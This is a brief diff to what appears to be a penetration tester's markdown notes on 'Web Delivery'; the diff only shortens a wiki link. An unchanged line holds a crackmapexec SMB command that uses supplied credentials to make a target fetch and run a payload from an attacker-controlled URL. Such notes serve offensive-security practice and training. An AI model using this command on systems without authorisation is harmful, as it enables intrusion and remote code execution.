@@ -2,7 +2,7 @@
 
 ## 01 - Web Delivery
 
-- Refer to [[Tactics && Techniques && Procedures (TTPs) Phases/Initial Access/Delivery/Web Drive-by/C2 Frameworks/Metasploit|Metasploit Web Delivery]] module.
+- Refer to [[Web Delivery|Metasploit Web Delivery]] module.
 
 `$ crackmapexec smb <IP> -u <username> -p <password> -d <domain_name> -M web_delivery -o URL=http://<attacker_IP>/<URI>`
 
